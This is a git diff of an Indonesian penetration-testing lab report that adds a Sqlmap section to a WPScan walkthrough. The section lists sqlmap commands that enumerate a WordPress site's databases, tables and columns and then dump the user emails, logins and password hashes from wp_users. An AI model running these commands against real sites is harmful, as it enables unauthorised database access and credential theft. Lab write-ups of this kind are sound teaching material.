@@ -181,11 +181,27 @@ Langkah - Langkah Instalasi Sqlmap
 Uji Coba Penetrasi <a name="uji"/>
 -----------------
 #### A. WPScan
-1. Buka terminal lalu ketiikkan `wpscan`
+1. Buka terminal lalu ketikkan `wpscan`
 2. Masukkan perintah `wpscan -u 10.151.36.103 --enumerate vp`
 3. Akan muncul hasil dari scanning yang dilakukan seperti berikut
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/wpscan.png "Result WPScan")
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/wpscan2.png "Result WPScan")
+
+#### B. Sqlmap
+1. Buka terminal lalu ketikkan `sqlmap`
+2. Masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -p --dbs` untuk melihat daftar database apa saja yang ada
+3. Jika berhasil maka akan muncul database apa saja yang tersedia, contohnya seperti berikut
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_database.png "Syntax to show database")
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_database.png "Result database")
+4. Untuk melihat daftar table apa saja yang ada di database **wordpress** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -D wordpress --tables`
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_table.png "Syntax to show table")
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_table.png "Result table")
+5. Untuk melihat kolom apa saja yang ada pada **wp_users** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -T wp_users --coloumns`
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_coloumn.png "Syntax to show coloumn")
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_coloumn.png "Result coloumn")
+6. Untuk isi record user_email, user_login, user_pass pada kolom **wp_users** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -T wp_users -C user_email,user_login,user_pass`
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_record.png "Syntax to show record")
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_record.png "Result record")
 
 Kesimpulan dan Saran <a name="kesimpulan"/>
 -----------------
